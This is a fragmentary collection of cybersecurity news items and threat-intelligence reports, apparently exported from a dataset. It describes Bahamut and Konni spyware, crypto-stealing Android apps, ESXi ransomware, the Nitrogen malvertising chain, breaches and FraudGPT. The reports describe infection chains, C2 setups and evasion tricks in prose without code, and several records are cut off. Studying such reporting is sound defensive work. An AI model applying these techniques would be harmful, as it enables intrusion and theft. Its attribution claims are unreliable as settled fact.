intent.Part of the Kotlin code shows the exploitation of various permissions: the object “LibConfigKt” deals with the enabling and disabling of permissions, and the same object is called in different modules to exploit the permissions accessed by the suspicious App.This excerpt shows the API module that is being used as a command-and-control server. Port 2053 is configured to the domain, where the transportation of data takes place.The snippet below shows comments passed in one of the modules, revealing the use of the Ktor framework developed with Kotlin. Ktor is employed to establish communication between the command-and-control server and the app. Last month, our report exposed Android malware belonging to the DoNot APT, which had employed a similar library called retrofit for HTTP requests in their Android Malware, deployed on the Google Play Store. The malicious app has since been deleted.Here are some more out-takes from another module that interacts with the App, as part of monitoring different messenger apps like Telegram, Signal, Facebook Messenger, etc.These snapshots are from a module that reveals the creation of JSON Object, which stores fetched information such as IMEI, Device ID, and SIM details, including location.The following is from the module that performs RSA Encryption using the public key:These module snapshots demonstrate the function of the encryption method to start the process of encrypting data. The analyses reveal that the threat actor is storing data in encrypted form using RSA/ECB/OAEPPadding.The following demonstrates a captured Live HTTP request, which shows the letsencrypt certificate being used for encrypted communication between the app and server to dodge network interception.Through our technical analyses, we confidently attribute this attack to APT Bahamut. However, the tactics employed by this threat actor are similar to the tactics employed by APT DoNot, and it is also interesting to note that the target geography of both the threat actors is similar to each other.In this specific attack, the threat actor conducted targeted spear messaging attacks on WhatsApp Messenger, focusing on individuals in the South Asia region. The malicious payload was delivered directly through WhatsApp chat. The attack on the individual served the interest of one nation state government. The nature of this attack, along with previous incidents involving APT Bahamut, possibly indicate that it was carried out to serve the interests of one nation state government. Notably, APT Bahamut has previously targeted Khalistan supporters, advocating for a separate nation, posing an external threat to India. The threat actor has also aimed at military establishments in Pakistan and individuals in Kashmir, all aligning with the interests of one nation state government.We are unable to disclose the specific target location of the sensitive cyber-attack, due to its sensitivity and security concerns. However, we can confirm that the target serves the interests of one nation state government. While some security organizations initially identified the threat as originating from a mercenary group, our own analysis indicates that it is, in fact, an Indian APT group acting on behalf of one nation state government. Several reasons support this conclusion.Firstly, it is highly unlikely that the said nation state government will employ mercenary groups for hacking sensitive targets, unless the group is based within Indian territory. Based on past and present targets, it strongly suggests that the APT group operates within Indian territory. Furthermore, the threat actor utilized encryption techniques to secure the data and network traffic, using the same certificate authority as the DoNot APT group, which previously deployed Android Malware on the Google Play Store. Moreover, the APT actor employed the Ktor Library to efficiently fetch and transfer data to the command-and-control server, a tactic similar to how the DoNot APT group used retrofit for a similar data retrieval function.Taking all these factors into account, our analysis strongly indicates that the APT group behind the attack has ties to the Indian territory and is acting in the interest of one nation state government.Copyright CYFIRMA.

      "text": " 지니언스 시큐리티 센터에서  위협분석 보고서를 발간했습니다. 이 보고서는 최신 사이버 위협과 취약점을 조사하고, 신속한 대응과 예방을 위한 정보를 제공합니다.  (전문보기 아래 링크)○ 지난 6월 27일 지니언스 시큐리티 센터(이하 GSC)는 북한배후 해킹 그룹으로 지목된 코니(Konni)의 새로운 사이버 위협 활동을 식별했습니다. GSC는 본 위협 캠페인이 수년간 국내에서 지속 중이며, 금융 정보 탈취 목적에 높은 우선순위가 있다고 판단합니다.○ 물론, 대북분야 종사자를 포함해 공격 대상이 폭넓게 병행 중인 점은 북한 연계 그룹의 고유한 특징 중 하나입니다. GSC는 해당 위협 활동을 꾸준히 추적 관찰하고 있으며, 초기 정찰 과정부터 측면 이동까지 단계별 프로세스 분석과 위험도 평가, Genian EDR 대응 검증을 수행 중입니다.○ 본 사례는 국세청 우편물 센터에서 발송한 알림 서비스처럼 위장했습니다. 국세청은 납세자에게 알릴 내용이 있을 때 납세자의 주소지로 우편물을 보냅니다. 세금 고지서나 신고 안내문과 같은 우편이 대표적인데, 국세청에서 보낸 우편물을 납세자가 제때 확인하지 못한 경우에는 세금이 체납될 수 있습니다. 공격자는 이런 점을 악용해 스피어 피싱 공격 테마로 삼았습니다.○ 세금 관련 이슈는 기업 관계자로서 매우 민감한 소재 중 하나로 실제 공격을 받은 대상자는 대북분야 기업의 대표입니다. 수신자로 하여금 불안 심리를 증폭시켜, 첨부 파일에 대한 접근을 보다 빠르게 만들기 위한 위협 전략으로 관측됩니다. 이메일에는 ‘소명자료 제출요청 안내.zip’ 이름의 압축 파일이 첨부돼 있으며, 압축 파일 내부에는 2개의 HWP 문서 파일과 1개의 LNK 바로가기 파일이 포함돼 있습니다. LNK 파일명은 ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 입니다.○ ‘소명자료 목록(국세징수법 시행규칙).hwp.lnk’ 바로가기 파일이 실행되면 피해자 컴퓨터의 주요 정보를 수집해 유출을 시도하고, 순차적 다단계 (VBS, BAT, Powershell) 명령을 통해 추가 악성 파일 설치 등 잠재적 위협에 노출됩니다.[그림 01] 악성 파일 전체 흐름도○ 탈로스에 따르면, 3년 동안 관찰된 다수의 위협 캠페인에서 공격자는 초기 공격 벡터로 스피어 피싱 수법을 구사했습니다. 사회공학적 기법과 결합해 이메일에 첨부된 악성 파일을 열어보도록 유도하고, 미끼(Decoy) 문서를 사용자에게 표시한 다음 피해자 컴퓨터에서 악성 파일을 실행합니다.○ 코니 캠페인은 한국을 대상으로 한 다양한 위협 사례서 꾸준히 보고됐습니다. 주로 비트코인이나 북한 및 러시아, 그 외 여러 사회적 이슈나 특정 관심사 등 민감 소재를 접목해 이용자들을 현혹해 오고 있습니다. 특히, 국내에서는 EXE 및 CHM 유형뿐만 아니라 HWP, XLS, DOC 등 문서 기반 악성파일을 사용한 공격이 지속 보고됐습니다.○ 공격자는 다양한 실전 경험을 통해 효과적인 위협 시나리오를 기획하고, 거점용 C2(명령제어) 서버를 구축해 본격적인 공격을 준비합니다. 그리고 공격 대상자를 선정 후 현혹될 만한 주제의 내용과 악성 파일을 개발해 스피어 피싱 공격을 수행했습니다.○ LNK 바로가기 타입의 공격은 국내에서 다수 보고되고 있습니다. 특히, APT37 그룹은 자동화된 악성코드 제작도구까지 도입해 활용하는 등 나름 적극적으로 사용 중인데, 코니 그룹이 사용한 코드와는 기술적으로 일부 상이한 구조를 보입니다.○ APT37 그룹과 다르게 코니 그룹이 사용한 LNK 파일은 포맷 내부에 16진수 스트링 데이터를 블럭화해 Powershell 명령을 수행합니다. 미끼로 보여줄 정상 (문서) 파일 후위에 악성 ZIP 또는 CAB 압축 포맷이 연이어 내장돼 있는 부분도 고유한 특징입니다. 압축내 악성 VBS 스크립트와 BAT 파일 등을 Powershell 명령어로 풀어 호출하는 과정을 거치게 됩니다.○ 실행 과정에 필요한 환경변수 등은 알파벳 대소문자 조합의 임의의 문자열을 사용해 가독성을 낮추고, 압축이 풀린 Documents 경로내 VBS 파일을 통해 별도의 BAT 파일을 연속적으로 실행하게 됩니다.○ 코니 그룹이 사용하는 악성 스크립트 명령에는 보통 ‘pakistan.txt’ 파일의 존재 여부 비교 루틴이 있습니다. 만약, 해당 파일이 경로에 존재할 경우 주요 명령을 점프해 퇴장(EXIT)하는 루틴으로 이동하게 됩니다. 따라서 이 파일은 일종의 ‘킬 스위치(kill switch)’ 역할을 수행할 수 있고, 공격자가 의도적으로 활용 중입니다.○ 본 사례의 경우 악성 LNK 바로가기 파일 구조 내부에 ‘자금출처명세서(부가가치세법 시행규칙).hwp’ 정상 문서와 ‘04769.zip’ 파일이 임베디드 된 형태로 보관되어 있습니다. 정상 문서 파일은 LNK 파일이 실행된 경로에 만들어지고, 압축 파일은 ‘Public’ 공용 폴더 경로에 생성됩니다. 압축은 공용 경로 하위의 ‘Documents’ 공용 문서 경로에 풀리고, ‘start.vbs’ 파일이 실행되는 과정을 거치게 됩니다.[그림 02] Genian EDR에서 코니 위협 캠페인 행위 탐지 화면  이 글 공유하기"

      "text": " Two new Android malware families named 'CherryBlos' and 'FakeTrade' were discovered on Google Play, aiming to steal cryptocurrency credentials and funds or conduct scams.The malicious apps use various distribution channels, including social media, phishing sites, and deceitful shopping apps on Google Play, Android's official app store.CherryBlos malware was seen distributed for the first time in April 2023, in the form of an APK (Android package) file promoted on Telegram, Twitter, and YouTube, under the guise of AI tools or coin miners.The names used for the malicious APKs are GPTalk, Happy Miner, Robot999, and SynthNet, downloaded from the following websites with matching domain names:A malicious Synthnet app was also uploaded onto the Google Play store, where it was downloaded roughly a thousand times before being reported and removed.CherryBlos is a cryptocurrency stealer that abuses Accessibility service permissions to fetch two configuration files from the C2 server, automatically approve additional permissions, and prevent the user from killing the trojanized app.CherryBlos uses a range of tactics to steal cryptocurrency credentials and assets, with the main tactic being to load fake user interfaces that mimic official apps to phish for credentials.However, a more interesting feature can be enabled, which uses OCR (optical character recognition) to extract text from images and photos stored on the device.For example, when setting up new cryptocurrency wallets, users are given a recovery phrase/password consisting of 12 or more words that can be used to recover the wallet on the computer.After showing these words, users are prompted to write them down and store them in a safe place, as anyone with this phrase can use it to add your crypto wallet to a device and access the funds within it.However, if this malware feature is enabled, it could potentially OCR the image and extract the recovery phrase, allowing them to steal the wallet.The collected data is then sent back to the threat actors' servers at regular intervals, as shown below.The malware also acts as a clipboard hijacker for the Binance app by automatically switching a crypto recipient's address with one under the attacker's control, while the original address appears unchanged to the user.This behavior allows the threat actors to redirect payments sent to users to their own wallets, effectively stealing the transferred funds.These apps use shopping themes or money-making lures that trick users into watching ads, agreeing to premium subscriptions, or topping up their in-app wallets and never allowing them to cash out the virtual rewards.The apps use a similar interface and generally target users in Malaysia, Vietnam, Indonesia, Philippines, Uganda, and Mexico, while most of them were uploaded onto Google Play between 2021 and 2022.Google told BleepingComputer that the reported malware apps had been removed from Google Play.\"We take security and privacy claims against apps seriously, and if we find that an app has violated our policies, we take appropriate action,\" Google told BleepingComputer.However, as thousands of users have already downloaded them, manual clean-ups might be required on infected devices."

      "text": " \"Digital twins\" — AI assistants trained to service our many needs by learning about and in some ways mimicking us — turn out to have myriad ways they might be turned against us.Ben Sawyer, a professor at the University of Central Florida, and Matthew Canham, CEO of Beyond Layer Seven, note that despite the furor over how large language models (LLMs) will enable hackers to design more, better phishing emails, vishing calls, and bots, that kind of thing is old hat. \"It's not in the future, it's in the past,\" Sawyer explains. \"Can an LLM write a phishing email? Yes, and it's been able to since before ChatGPT took the world's attention. Can it do a lot more? That's what we're really interested in.\"By contrast, defending against LLM compromise — or even finding out that something is wrong in the first place — is far more difficult to imagine. \"The problem is it's too complex to audit the entire space. Nobody can go through everything ChatGPT might say and check it,\" Sawyer says.Today's social engineering attacks rely on an attacker's ability to closely mimic known individuals (like co-workers) or brands.Tomorrow's social engineering, Sawyer and Canham think, will be defined by AI's uncanny ability to mimic us and tug on our subconscious preferences.For example, \"multiple studies in psychology show that if you take someone's face, and you subtly morph that into another face, that person develops an affinity towards that new face,\" Canham explains. Companies can leverage such a known psychological preference, as can anyone else trying to manipulate you via your AI. And how would you, the user, tell the difference? There's no zero-trust model for the human brain.\"If a digital twin becomes compromised, there's no way for me to know,\" Sawyer says. \"Instantly, the technology moves from serving your interests to serving the interests of the individual who is compromising you. And it is socially adept [enough] not to do anything you can detect. So digital twins are going to be trusted like humans, but they just don't have that same transparency.\"With the ability to invisibly pull on our subconscious psychological levers, future AI digital twins pose a much greater threat than any data theft or phishing, and malicious actors could take advantage to cause real harm.We often recommend technical measures to combat social engineering — detection, antivirus, or just typing into one's browser instead of clicking a link.To Sawyer, a fundamentally social problem requires a social solution. And \"one very useful thing here is that psychology already understands human manipulation. There is a select group of psychologists that are fluent in concepts of engineering, cybersecurity, computer science. I think this community is one that can really help.\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "title": "Ryanair Hit With Lawsuit Over Use of Facial Recognition Technology",
      "text": " Ryanair has become the latest organization to face legal action over its use of facial recognition technology, due to potential data collection and privacy issues. The European Center for Digital Rights, a Vienna-based digital rights group that prefers to be referred to as Noyb, filed a lawsuit this week accusing Ryanair of violating the privacy rights of some of its customers.The complaint has to do with Ryanair's practice of requiring customers who book flights with third-party online agents to go through an additional identity verification process. The quickest option that customers have is to submit to identity verification through facial recognition technology. Those who don't want to do that must either show up at the airport at least two hours prior to flight time or submit their identification documents to Ryanair and wait for up to a week for the airline to vet their signatures.The nonprofit privacy rights group claimed Ryanair's real motive in subjecting some customers to additional verification was to discourage them from using third-party agents for future bookings. \"The verification of contact details via biometrics doesn't make a lot of sense: Your email address is not printed on your face or in your passport,\" Noyb said. The lawsuit claims Ryanair's requirement is a violation of Europe's General Data Protection Regulation (GDPR) and requests the company be fined the equivalent $210 million.In a statement to Dark Reading, a Ryanair spokesman again defended the company's practice. She called the additional verification requirement necessary to ensuring that Ryanair customers who book through third-party agents make all required security declarations, and are aware of all safety and regulatory protocols. \"[Online travel agents (OTAs)] scrape Ryanair’s inventory and in many cases miss-sell our flights and ancillary services with hidden markups, and provide incorrect customer contact information / payment details,\" the statement said. \"As a result, and in order to protect customers, any customers who book through an OTA are required to complete a simple customer-verification process, and can choose biometric verification or alternatively complete a digital verification form which are both fully compliant with all GDPR regulations.\"The Ryanair lawsuit is one of many that challenges the use of facial recognition technologies in recent years.Ryanair itself is using the technology to purportedly verify and authenticate a person's identity. It's a use case that is rapidly growing — for instance, to match an individual's face to an existing photo ID document when issuing a digital ID card, passport, or driver's license, or to passively authenticate a person as they access multiple services. Other rapidly growing rapidly use cases for facial recognition include security and surveillance, photo tagging, and as an alternative to signatures, PIN codes, and passwords.There have been several lawsuits in the US that have challenged to use of facial recognition technologies. Many of them have invoked the Illinois Biometric Information Privacy Act (BIPA), which some legal experts consider to be among the toughest in the country. The law requires organizations using facial recognition technologies to obtain informed written consent and adequately disclose the collection, storage, and use of the data. It also imposes strict retention limits for biometric data and provides for up to $5,000 per violation for Illinois residents.Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " The Abyss Locker operation is the latest to develop a Linux encryptor to target VMware's ESXi virtual machines platform in attacks on the enterprise.As the enterprise shifts from individual servers to virtual machines for better resource management, performance, and disaster recovery, ransomware gangs create encryptors focused on targeting the platform.With VMware ESXi being one of the most popular virtual machine platforms, almost every ransomware gang has begun to release Linux encryptors to encrypt all virtual servers on a device.Like other ransomware operations, the Abyss Locker threat actors will breach corporate networks, steal data for double-extortion, and encrypt devices on the network.The stolen data is then used as leverage by threatening to leak files if a ransom is not paid. To leak the stolen files, the threat actors created a Tor data leak site named 'Abyss-data' that currently lists fourteen victims.The threat actors claim to have stolen anywhere between 35 GB of data from one company to as high as 700 GB at another.After looking at the strings in the executable, it is clear that the encryptor specifically targets VMware ESXi servers.As you can see from the commands below, the encryptor utilizes the 'esxcli' command-line VMware ESXi management tool to first list all available virtual machines and then terminate them.The soft option performs a graceful shutdown, the hard option terminates a VM immediately, and force is used as a last resort.The encryptor terminates all virtual machines to allow the associated virtual disks, snapshots, and metadata to be properly encrypted by encrypting all files with the following extensions: .vmdk (virtual disks), .vmsd (metadata), and .vmsn (snapshots).In addition to targeting virtual machines, the ransomware will also encrypt all other files on the device and append the .crypt extension to their filenames, as shown below.For each file, the encryptor will also create a file with a .README_TO_RESTORE extension, which acts as the ransom note.This ransom note contains information on what happened to the files and a unique link to the threat actor's Tor negotiation site. This site is barebones, only having a chat panel that can be used to negotiate with the ransomware gang.Unfortunately, HelloKitty has historically been a secure ransomware, preventing the recovery of files for free."

      "text": " Google has published its annual 0-day vulnerability report, presenting in-the-wild exploitation stats from 2022 and highlighting a long-standing problem in the Android platform that elevates the value and use of disclosed flaws for extended periods.More specifically, Google's report highlights the problem of n-days in Android functioning as 0-days for threat actors. The problem stems from the complexity of the Android ecosystem, involving several steps between the upstream vendor (Google) and the downstream manufacturer (phone manufacturers), significant discrepancies in security update intervals between different device models, short support periods, responsibility mixups, and others issues.A zero-day vulnerability is a software flaw known before a vendor becomes aware or fixes it, allowing it to be exploited in attacks before a patch is available. However, an n-day vulnerability is one that is publicly known with or without a patch.For example, if a bug is known in Android before Google, it is called a zero-day. However, once Google learns about it, it becomes an n-day, with the n reflecting the number of days since it became publicly known.Google warns that attackers can use n-days to attack unpatched devices for months, using known exploitation methods or devising their own, despite a patch already being made available by Google or another vendor.This is caused by patch gaps, where Google or another vendor fixes a bug, but it takes months for a device manufacturer to roll it out in their own versions of Android.\"While these gaps exist in most upstream/downstream relationships, they are more prevalent and longer in Android.\"This flaw was found to be exploited in the wild in November 2022, a month after ARM released a fix.Exploitation continued unabated until April 2023, when the Android security update pushed the fix, a whopping six months after ARM addressed the security problem.Even after Google releases the Android security update, it takes device vendors up to three months to make the fixes available for supported models, giving attackers yet another window of exploitation opportunity for specific devices.This patch gap effectively makes an n-day as valuable as a zero-day for threat actors who can exploit it on unpatched devices. Some may consider these n-days more useful than zero-days as the technical details have already been published, potentially with proof-of-concept (PoC) exploits, making it easier for threat actors to abuse them.The good news is that Google's 2022 activity summary shows that zero-day flaws are down compared to 2021, at 41 found, while the most significant drop was recorded in the browsers category, which counted 15 flaws last year (was 26 in 2021).Another notable finding is that more than 40% of the zero-day vulnerabilities discovered in 2022 were variants of previously reported flaws, as bypassing fixes for known flaws is usually easier than finding a novel 0-day that can serve on similar attack chains."

GraphicalProton is another malware in the arsenal of the group, unlike GraphicalNeutrino, which used Notion for C2, it uses Microsoft’s OneDrive or Dropbox for C2 communication.Both GraphicalNeutrino and GraphicalProton are used as a loader, the latter is staged within an ISO or ZIP file delivered via a phishing email.“In May 2023, Insikt Group first described the GraphicalProton malware for clients. GraphicalProton acts as a loader, and, much like previously described samples of GraphicalNeutrino, is staged within an ISO or ZIP file and relies on the newly identified compromised domains for delivery to targeted hosts.” continues the report. “Unlike some previously analyzed samples of GraphicalNeutrino that employed Notion for C2, we observed that the newly identified GraphicalProton samples use Microsoft OneDrive instead.”The ISO files used in the attack contain .LNK files that masquerade as .PNG images of a BMW car that’s purportedly for sale. Upon clicking the file, it will start the GraphicalProton infection chain. Attackers use Microsoft OneDrive as C2 and periodically poll a folder in the storage service to fetch additional payloads.“As the war in Ukraine continues, it is almost certain that BlueBravo will continue to consider government and diplomatic institutions high-value targets for the foreseeable future.” concludes the report. “It is likely that BlueBravo, and by extension the Russian intelligence consumers reliant on the data BlueBravo provides, views these organizations as providing strategic insight into the decision-making process of governments allied with Ukraine.”\nCopyright@securityaffairs 2023 "

However, the researchers pointed out that the 40% drop is not only caused by improved security of software and hardware vendors.One of the most interesting data that emerged from the report is that over 40% of the 0-days discovered were variants of previously reported vulnerabilities. Below is the list of zero-day flaws that were variants of previously reported bugs:17 out of the 41 actively exploited zero-days from 2022 are variants of previously reported vulnerabilities, this data confirms a trend observed by the researchers in previous reports.Another aspect highlighted by Google researchers is that as per the attackers’ arsenal N-days function like 0-days on Android due to long patching times. This means that threat actors can use n-days that functioned as 0-days for a long period of time.Giving a close look at zero-day flaws disclosed by Google TAG, we can observe a 42% drop in the number of in-the-wild detected 0-days targeting browsers from 2021 to 2022 (from 26 to 15). The main reasons for this drop are browsers’ efforts to prevent exploitation and a shift in attacker behavior away from browsers towards 0-click exploits that target other components on the device. “Unlike many commodities in the world, a 0-day itself is not finite. Just because one person has discovered the existence of a 0-day vulnerability and developed it into an exploit doesn’t prevent other people from independently finding it too and using it in their exploit.” continues the report. “Most attackers who are doing their own vulnerability research and exploit development do not want anyone else to do the same as it lowers its value and makes it more likely to be detected and fixed quickly.”Stone recommends vendors provide patches and mitigations to end-users as fast as possible and suggests sharing more details about the root causes of the flaws.\nCopyright@securityaffairs 2023 "

The company employs 34,300 people and has an annual revenue of about $4.25 billion, with a presence in the U.S., Canada, Australia, and the United Kingdom.After investigating the breach, Maximus found no indication that the hackers progressed further than the MOVEit environment, which was immediately isolated from the rest of the corporate network.However, this limited access was enough to compromise a large number of individuals to whom the firm is now sending data breach notifications.\"Maximus currently plans to record an expense of approximately $15 million for the quarter ended June 30, 2023, representing the Company's best estimate of the total investigation and remediation activities to be incurred related to the incident.\"The Clop ransomware gang added Maximus to its dark web data leak site yesterday as part of a big batch of 70 new victims, all having been breached using the MOVEit zero-day flaw.The entry on Clop's site claims they have stolen 169GB of data during the breach on Maximus' MOVEit Transfer server. However, no data has been leaked so far, so the extortion process is still underway.As the list of MOVEit zero-day flaw victims grows and the size of the attack somewhat normalizes the large-scale data breaches that have compromised the data of hundreds of millions, the Clop ransomware gang has resorted to more aggressive extortion tactics."

Previous Breached admin Baphomet has also confirmed the authenticity of the database, warning that its sale is part of a \"continued campaign attempting to destroy the community.\"\"Not only was the database submitted to HIBP, but it's being actively sold/leaked by at least one person - even attempting to do so on our forum,\" warned Baphomet.\"For that reason I'm sure we're going to see it public soon enough. Judging by the 212k users, this is likely an older database months before the closing of BFv1, seeing that my last backup of the forum has 336k users.\"Other than law enforcement, the seller said that only they, Baphomet, and Pompompurin have possession of the database.The threat actor says they are selling the Breached database to only one person for $100,000 - $150,000 and that it contains a snapshot of the entire database taken on November 29th, 2022.BleepingComputer was told that the database is 2 GB and contains all tables, including those for private messages, payment transactions, and the member database.The seller, breached_db_person, told BleepingComputer that the private message tables have a lot of incriminating information about forum members and that the 'members' database contains IP addresses showing that many threat actors don't follow good operational security by using residential IP addresses.The private messages table is valuable as it contains messages sent privately between the different members of the forum, potentially revealing information on past attacks, identities, and other useful information.Samples of the payments table were shared with BleepingComputer and contain information on payments made to purchase forum ranks (membership levels with extra benefits) and credits (a form of currency used on the forum).These payments were processed through CoinBase Commerce or Sellix, with the Coinbase transactions including links to order confirmations containing sensitive information, such as cryptocurrency addresses and Coinbase payment IDs.This cryptocurrency data can be useful to blockchain analytics companies, who can use the cryptocurrency addresses to link threat actors to criminal activity.Therefore, the private messages could be invaluable for researchers, with the seller stating that they have already been contacted by cybersecurity firms requesting a copy of the data for their own research.Other threat actors are also showing interest, with the seller saying they received an offer for $250,000.While it is too soon to tell whether the database will ultimately be sold, even if it is, it would not be surprising for the entire database to be leaked for free in the future.It is common for data breaches to first be purchased privately and then released later to increase reputation among the data theft community."

They could include smart devices, servers, virtual machines, cloud storage and unapproved messaging or collaboration tools.“Since these are not accounted for by asset management, nor aligned with corporate IT processes or policy, they’re a risk to your organization,” the document warns. “This could result in the exfiltration of sensitive data, or spread malware throughout the organization.”“It’s important to acknowledge that shadow IT is rarely the result of malicious intent. It’s normally due to staff struggling to use sanctioned tools or processes to complete a specific task,” explained NCSC security researcher, Simon B.“If they’re resorting to insecure workarounds in order to ‘get the job done’, then this suggests that existing policies need refining so that staff aren’t compelled to make use of shadow IT solutions.”In fact, reprimanding staff for using unsanctioned devices or services can seriously backfire, the NCSC warned.“For this reason, the guidance also points out the importance of developing a good cybersecurity culture, so that staff will be able to communicate openly about issues (including where current policy or processes are preventing them from working effectively).”"

This inference comes from observing the movement of funds from independent hot wallets and the sudden halting of trading. Moreover, the subsequent transactions have led ZachXBT, a renowned \"on-chain sleuth\", to surmise that North Korea's notorious Lazarus group is the perpetrator of this attack.\nGiven their history of similar exploits, I find myself agreeing with this theory. - D.

      "text": " A new 'Nitrogen' initial access malware campaign uses Google and Bing search ads to promote fake software sites that infect unsuspecting users with Cobalt Strike and ransomware payloads.The goal of the Nitrogen malware is to provide the threat actors initial access to corporate networks, allowing them to conduct data-theft, cyberespionage, and ultimately deploying the BlackCat/ALPHV ransomware.However, that report focused on the post-infection stage and lacked extensive IoCs (Indicators of Compromise) due to being based on a single response incident.The Nitrogen malware campaign starts with a person performing a Google or Bing search for various popular software applications.The software seen as lures for the Nitrogen malware campaign includes:Depending on the targeting criteria, the search engine will display an advertisement that promotes the searched-for software.Clicking the link brings the visitor to compromised WordPress hosting pages that imitate the legitimate software download sites for the particular application.Only visitors of specific geographic regions are redirected to the phishing sites, while direct hits onto the malicious URLs trigger a rick-rolling redirection to YouTube videos instead.​From those fake sites, users download trojanized ISO installers (\"install.exe\"), which contain and sideload a malicious DLL file (\"msi.dll\").The msi.dll is the installer for the Nitrogen initial access malware called internally \"NitrogenInstaller,\" which further installs the promised app to avoid suspicion and a malicious Python package.The NitrogenInstaller also creates a registry run key named \"Python\" for persistence, pointing to a malicious binary (\"pythonw.exe\") that runs every five minutes.The Python component will execute \"NitrogenStager\" (\"python.311.dll\"), which is responsible for establishing communication with the threat actor's C2 and launching a Meterpreter shell and Cobalt Strike Beacons onto the victim's system.In some cases observed by Sophos analysts, the attackers moved to hands-on activity once the Meterpreter script was executed on the target system, executing manual commands to retrieve additional ZIP files and Python 3 environments.The latter is needed for executing Cobalt Strike in memory, as the NitrogenStager cannot run Python scripts.Sophos says due to successfully detecting and stopping the observed Nitrogen attacks, it has not determined the threat actor's goal, but the infection chain point to staging the compromised systems for ransomware deployment.However, Trend Micro had previously reported that this attack chain led to the deployment of the BlackCat ransomware in at least one case.Users are recommended to avoid clicking on \"promoted\" results in search engines when downloading software and instead only downloading from the developer's official site.Also, be wary of any downloads utilizing ISO files for software, as that is an uncommon method to distribute legitimate Windows software, which usually comes as an .exe or .zip archive.Update 7/27 - A Google spokesperson has sent BleepingComputer the following statement:We have strict policies that prohibit ads that distribute malicious software. Our teams detected the malware campaigns mentioned in the report prior to its publication.We moved quickly to remove the ads that violated our policies and took appropriate action on the advertisers’ accounts."

A patch is now available, but Baines claimed that around 472,000 RouterOS devices globally are still vulnerable via their web management interface – with the figure rising to more than 920,000 if exploitation happens via the Winbox management client.The vulnerability itself is a privilege escalation bug with a CVSS score of 9.1.Baines warned that although exploitation of the bug requires authentication, this is easier than one might think.VulnCheck claimed around 60% of RouterOS users are still running a default admin user.“RouterOS ships with a fully functional ‘admin’ user. Hardening guidance tells administrators to delete the “admin” user, but we know a large number of installations haven’t,” Baines explained.“To make matters worse, the default ‘admin’ password is an empty string, and it wasn’t until RouterOS 6.49 (October 2021) that RouterOS started prompting administrators to update blank passwords. Even when an administrator has set a new password, RouterOS doesn’t enforce any restrictions. Administrators are free to set any password they choose, no matter how simple. That’s particularly unfortunate because the system doesn’t offer any brute force protection (except on the SSH interface).”That means the best time to catch an attacker is when they’re attempting to brute force the admin credentials, if they decide to go down that route.Editorial image credit: awstoys / Shutterstock.com"

Breaches stemming from compromised credentials (37%/36%) accounted for a much bigger share than the cross-industry average of 29%.“The lack of adoption of multi-factor authentication (MFA) technology in the education sector makes them even more at risk of this method of compromise,” argued Chester Wisniewski, field CTO, Sophos.“Like the US federal government’s initiative to mandate all agencies use MFA, it is time for schools of all sizes to employ MFA for faculty, staff and students. It sets a good example and is a simple way to avoid many of these attacks from getting in the door.”“While most schools are not cash-rich, they are very highly visible targets with immediate widespread impact in their communities,” said Wisniewski.“The pressure to keep the doors open and respond to calls from parents to ‘do something’ likely leads to pressure to solve the problem as quickly as possible without regard for cost. Unfortunately, the data doesn’t support that paying ransoms resolves these attacks more quickly, but it is likely a factor in victim selection for the criminals.”"

Some of its features include crafting spear-phishing emails, creating undetectable malware, generating phishing pages, identifying vulnerable websites and even offering tutorials on hacking techniques.“Attackers can now generate phishing campaigns quickly and launch more simultaneously.”However, in a strategic move to evade marketplace exit scams, the actor established a presence on Telegram, providing a more stable platform to offer their malicious services.The subscription fees for FraudGPT range from $200 per month to $1700 per year, and the tool boasts over 3000 confirmed sales and reviews. To combat this escalating threat, experts emphasized the need for continuous innovation in cybersecurity defenses.“But perhaps the most important takeaway, given the emergence of black-hat GPT models, is that good security awareness, phishing and behavior change training work.”According to the executive, users with more expertise in a security awareness and behavior change program demonstrated notable resilience against human and AI-generated phishing attacks via emails.\"Failure rates dropped from over 14% with less trained users to between 2-4% with experienced users,\" Åvist explained.“It is of the utmost importance for security teams to use tools that leverage AI to increase the speed, accuracy and automation required to stop these threats from turning into breaches.”"

He still has a stake in the Russian legal entity, which will continue operating under a new brand, F.A.C.C.T. (Fight Against Cybercrime Technologies).Top Russian banks and companies, including those run by the state, are among the company’s clients.However, Sachkov’s lawyer, Sergei Afanasyev, told Russian press agency Interfax on July 21, 2023, that the claims against him are not related to the activities of Group-IB.His trial was held behind closed doors, which is conventional practice for treason trials, and little is publicly known about the case against him. According to Interfax, he is accused of transferring information containing state secrets abroad. He denied the accusation.His mother, partner, and several supporters were present for the verdict."

      "text": " Freelance JournalistThe threat of vendor email compromise (VEC) attacks has escalated, with recent data showing a sharp increase in such cyber-threats. The new figures show the likelihood of an organization falling victim to a VEC attack has risen from 45% in June 2022 to 70% in May 2023.Through these accounts, the threat actor orchestrated email attacks against 15 individuals across five customer organizations, including two healthcare companies, two logistics firms and one manufacturing company.The attack involved sending emails from the compromised accounts and attempting to reroute outstanding and future invoices to a new bank account, following a fake updated payment policy. The most cunning aspect of these attacks was the use of familiar language and known domains, making them appear genuine and bypassing traditional security defenses.While the emails contained subtle grammatical errors, they featured characteristics expected in legitimate vendor communications. These deceptive tactics, coupled with the absence of prior correspondence between senders and recipients, made the attacks challenging to detect for both human recipients and conventional email security solutions.Abnormal noted that all the emails shared peculiar phrasing, including a reference to a “bogus check” and “opting out from check for now.” Additionally, the attacker used the same contact phone number across all emails, linking the attacks to a shared originator.As a result, cybersecurity leaders are increasingly turning to innovative technologies, such as behavioral AI, which can identify deviations from normal user behavior and patterns. By blocking suspicious messages before they reach employee inboxes, these advanced solutions offer a more proactive approach to cybersecurity."

      "title": "Zero-Day Vulnerabilities Discovered in Global Emergency Services Communications Protocol",
